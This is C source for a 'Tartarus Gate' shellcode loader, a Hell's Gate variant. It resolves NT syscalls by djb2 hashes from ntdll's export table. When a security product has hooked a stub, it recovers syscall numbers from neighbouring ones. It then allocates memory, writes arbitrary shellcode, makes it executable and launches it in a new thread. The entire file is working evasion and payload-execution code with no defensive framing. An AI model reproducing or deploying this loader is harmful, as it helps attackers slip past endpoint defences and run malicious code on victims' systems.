#pragma once

#include <Windows.h>
#include "tartarus_gate_struct.h"
#include <stdio.h>

#define UP -32
#define DOWN 32


//typedef VOID(KNORMAL_ROUTINE) (
//	IN PVOID NormalContext,
//	IN PVOID SystemArgument1,
//	IN PVOID SystemArgument2);
//
//typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;
/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
    PVOID pAddress;
    DWORD64 dwHash;
    WORD wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, *PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();

BOOL GetImageExportDirectory(
        _In_ PVOID pModuleBase,
        _Out_ PIMAGE_EXPORT_DIRECTORY *ppImageExportDirectory
);

BOOL GetVxTableEntry(
        _In_ PVOID pModuleBase,
        _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
        _In_ PVX_TABLE_ENTRY pVxTableEntry
);

BOOL Payload(
        _In_ PVX_TABLE pVxTable,
        _In_ const unsigned char shellcode[],
        _In_ size_t size,
        _In_ boolean debug
);

PVOID VxMoveMemory(
        _Inout_ PVOID dest,
        _In_    const PVOID src,
        _In_    SIZE_T len
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);

extern HellDescent();


INT TARTARUS_GATE_MAIN(unsigned char *shellcode, size_t size, boolean debug) {
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return 0x1;
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY) (
            (PBYTE) pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;
    VX_TABLE Table = {0};
    Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
        return 0x1;
    Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
        return 0x1;
    Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
        return 0x1;
    Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
        return 0x1;
    Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
        return 0x1;
    Payload(&Table, shellcode, size, debug);
    return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB) __readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY *ppImageExportDirectory) {
    // Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    // Get NT headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS) ((PBYTE) pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) pModuleBase +
                                                         pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD) ((PBYTE) pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD) ((PBYTE) pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD) ((PBYTE) pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR) ((PBYTE) pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE) pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;

            // First opcodes should be :
            //    MOV R10, RCX
            //    MOV RAX, <syscall>
            if (*((PBYTE) pFunctionAddress) == 0x4c
                && *((PBYTE) pFunctionAddress + 1) == 0x8b
                && *((PBYTE) pFunctionAddress + 2) == 0xd1
                && *((PBYTE) pFunctionAddress + 3) == 0xb8
                && *((PBYTE) pFunctionAddress + 6) == 0x00
                && *((PBYTE) pFunctionAddress + 7) == 0x00) {

                BYTE high = *((PBYTE) pFunctionAddress + 5);
                BYTE low = *((PBYTE) pFunctionAddress + 4);
                pVxTableEntry->wSystemCall = (high << 8) | low;

                return TRUE;
            }
            //if hooked check the neighborhood to find clean syscall
            if (*((PBYTE) pFunctionAddress) == 0xe9) {
                for (WORD idx = 1; idx <= 500; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE) pFunctionAddress + idx * DOWN) == 0x4c
                        && *((PBYTE) pFunctionAddress + 1 + idx * DOWN) == 0x8b
                        && *((PBYTE) pFunctionAddress + 2 + idx * DOWN) == 0xd1
                        && *((PBYTE) pFunctionAddress + 3 + idx * DOWN) == 0xb8
                        && *((PBYTE) pFunctionAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE) pFunctionAddress + 7 + idx * DOWN) == 0x00) {
                        BYTE high = *((PBYTE) pFunctionAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE) pFunctionAddress + 4 + idx * DOWN);
                        pVxTableEntry->wSystemCall = (high << 8) | low - idx;

                        return TRUE;
                    }
                    // check neighboring syscall up
                    if (*((PBYTE) pFunctionAddress + idx * UP) == 0x4c
                        && *((PBYTE) pFunctionAddress + 1 + idx * UP) == 0x8b
                        && *((PBYTE) pFunctionAddress + 2 + idx * UP) == 0xd1
                        && *((PBYTE) pFunctionAddress + 3 + idx * UP) == 0xb8
                        && *((PBYTE) pFunctionAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE) pFunctionAddress + 7 + idx * UP) == 0x00) {
                        BYTE high = *((PBYTE) pFunctionAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE) pFunctionAddress + 4 + idx * UP);
                        pVxTableEntry->wSystemCall = (high << 8) | low + idx;

                        return TRUE;
                    }

                }
                return FALSE;
            }
            if (*((PBYTE) pFunctionAddress + 3) == 0xe9) {
                for (WORD idx = 1; idx <= 500; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE) pFunctionAddress + idx * DOWN) == 0x4c
                        && *((PBYTE) pFunctionAddress + 1 + idx * DOWN) == 0x8b
                        && *((PBYTE) pFunctionAddress + 2 + idx * DOWN) == 0xd1
                        && *((PBYTE) pFunctionAddress + 3 + idx * DOWN) == 0xb8
                        && *((PBYTE) pFunctionAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE) pFunctionAddress + 7 + idx * DOWN) == 0x00) {
                        BYTE high = *((PBYTE) pFunctionAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE) pFunctionAddress + 4 + idx * DOWN);
                        pVxTableEntry->wSystemCall = (high << 8) | low - idx;
                        return TRUE;
                    }
                    // check neighboring syscall up
                    if (*((PBYTE) pFunctionAddress + idx * UP) == 0x4c
                        && *((PBYTE) pFunctionAddress + 1 + idx * UP) == 0x8b
                        && *((PBYTE) pFunctionAddress + 2 + idx * UP) == 0xd1
                        && *((PBYTE) pFunctionAddress + 3 + idx * UP) == 0xb8
                        && *((PBYTE) pFunctionAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE) pFunctionAddress + 7 + idx * UP) == 0x00) {
                        BYTE high = *((PBYTE) pFunctionAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE) pFunctionAddress + 4 + idx * UP);
                        pVxTableEntry->wSystemCall = (high << 8) | low + idx;
                        return TRUE;
                    }

                }
                return FALSE;
            }
        }
    }

    return TRUE;
}

BOOL Payload(PVX_TABLE pVxTable, const unsigned char *code, size_t size, boolean nativeDebug) {
    NTSTATUS status;
    char *shellcode = (char *) malloc(size);
    for (int i = 0; i < size; i++) {
        shellcode[i] = (char) code[i];
    }
    PVOID lpAddress = NULL;
    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE) -1, &lpAddress, 0, &size, MEM_COMMIT, PAGE_READWRITE);
    if (nativeDebug) {
        printf("[+] allocate memory for the shellcode: %ld\n", status);
    }
    VxMoveMemory(lpAddress, shellcode, size);
    if (nativeDebug) {
        printf("[+] write memory\n");
    }
    ULONG ulOldProtect = 0;
    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE) -1, &lpAddress, &size, PAGE_EXECUTE_READ, &ulOldProtect);
    if (nativeDebug) {
        printf("[+] change page permissions: %ld\n", status);
    }
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
    status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE) -1, (LPTHREAD_START_ROUTINE) lpAddress,
                         NULL, FALSE, NULL, NULL, NULL, NULL);
    if (nativeDebug) {
        printf("[+] create thread: %ld\n", status);
    }
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
    status = HellDescent(hHostThread, FALSE, &Timeout);
    if (nativeDebug) {
        printf("[+] wait: %ld\n", status);
    }
    return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
    char *d = dest;
    char *s = src;
    if (d < s)
        while (len--)
            *d++ = *s++;
    else {
        char *lasts = s + (len - 1);
        char *lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}